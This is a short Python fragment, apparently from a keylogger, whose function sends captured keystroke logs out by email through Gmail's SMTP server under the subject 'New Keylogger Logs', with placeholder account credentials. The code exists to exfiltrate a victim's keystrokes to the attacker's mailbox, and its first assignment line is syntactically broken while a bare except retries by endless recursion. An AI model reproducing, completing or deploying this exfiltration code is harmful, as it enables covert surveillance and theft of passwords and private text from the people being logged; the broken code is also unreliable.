import smtplib
import time

def SendMessages(strLogs):
    try:
        strDateTime = "Keylogger Started At: "  + strDateTime = time.strftime("%d/%m/%Y") +
                    "\t" + time.strftime("%I:%M:%S")
        strMessage = strDateTime + "\n\n" + strLogs

        strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)


        SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        SmtpServer.ehlo()   # identifies you to the smtp server
        SmtpServer.login("YOURGMAILADDRESS", "YOURGMAILPASSWORD")
        SmtpServer.sendmail("YOURGMAILADDRESS", "YOURGMAILADDRESS", strMessage)
    except:
        time.sleep(5)   # freeze program for 5 seconds to try again
        SendMessages(strLogs)
